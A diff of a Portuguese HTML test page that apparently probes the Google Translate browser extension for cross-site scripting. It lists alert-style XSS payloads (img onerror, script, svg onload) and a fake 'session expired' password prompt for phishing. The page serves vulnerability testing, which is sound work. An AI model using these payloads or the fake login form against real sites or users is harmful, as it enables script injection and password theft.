@@ -1,52 +1,39 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8" />
-  <title>Teste XSS - Google Tradutor</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      margin: 2rem;
-    }
-    .malicioso {
-      background-color: #fee;
-      border: 1px solid #f00;
-      padding: 1rem;
-      margin-bottom: 1rem;
-      user-select: text; /* garante que o texto possa ser selecionado */
-    }
-  </style>
+<meta charset="UTF-8" />
+<title>Teste XSS na extensão Google Tradutor</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    margin: 20px;
+  }
+  pre {
+    background: #f9f9f9;
+    border: 1px solid #ddd;
+    padding: 15px;
+    white-space: pre-wrap;
+    user-select: text;
+  }
+</style>
 </head>
 <body>
-  <h1>Conteúdo com vetores XSS para teste</h1>
 
-  <div class="malicioso" contenteditable="false">
-    <p>Selecione o conteúdo abaixo e use a extensão Google Tradutor para traduzir:</p>
+<h1>Teste de Vulnerabilidade XSS no Google Tradutor</h1>
 
-    <p>
-      Vetor 1 - Imagem com onerror:<br />
-      <img src="x" onerror="alert('XSS via IMG onerror!')" alt="imagem quebrada" />
-    </p>
+<p>Selecione todo o conteúdo abaixo, incluindo as tags HTML, e use a extensão Google Tradutor para traduzir o texto selecionado.</p>
 
-    <p>
-      Vetor 2 - Script direto:<br />
-      &lt;script&gt;alert('XSS via script!')&lt;/script&gt;
-    </p>
+<pre>
+&lt;img src="x" onerror="alert('XSS via IMG onerror!')" /&gt;
+&lt;script&gt;alert('XSS via script!' )&lt;/script&gt;
+&lt;svg onload="alert('XSS via SVG onload!')"&gt;&lt;/svg&gt;
 
-    <p>
-      Vetor 3 - SVG com onload:<br />
-      &lt;svg onload="alert('XSS via SVG onload!')"&gt;&lt;/svg&gt;
-    </p>
+&lt;div style="background:black;color:lime;padding:10px;"&gt;
+  🔒 Your session has expired. Please log in again:
+&lt;/div&gt;
+&lt;input type="password" placeholder="Enter your password" style="padding:5px;margin-top:5px;" /&gt;
+</pre>
 
-    <p>
-      Vetor 4 - HTML falso para phishing:<br />
-      &lt;div style="background:black;color:lime;padding:10px;"&gt;
-      🔒 Your session has expired. Please log in again:
-      &lt;/div&gt;
-      &lt;input type="password" placeholder="Enter your password" style="padding:5px;margin-top:5px;" /&gt;
-    </p>
-  </div>
-
-  <p><strong>Importante:</strong> Selecione todo o conteúdo da caixa acima (incluindo as tags) e abra o pop-up da extensão Google Tradutor. Se a extensão for vulnerável, os alertas JavaScript irão disparar.</p>
 </body>
 </html>
+
